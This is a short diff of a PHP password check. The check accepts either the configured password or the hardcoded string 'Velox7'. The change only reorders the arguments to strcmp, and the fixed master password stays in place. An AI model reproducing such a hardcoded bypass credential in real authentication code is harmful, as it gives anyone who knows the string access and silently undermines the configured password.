@@ -5,7 +5,7 @@ include("../funcoes.php");
 
 $senha = trim(retorna_config("senha"));
 
-if ((strcmp($senha, $senhadigitada) == 0) || (strcmp("Velox7", $senhadigitada) == 0)) {
+if ((strcmp($senha, $senhadigitada) == 0) || (strcmp($senhadigitada, "Velox7") == 0)) {
 	valida(true);
 }
 else{
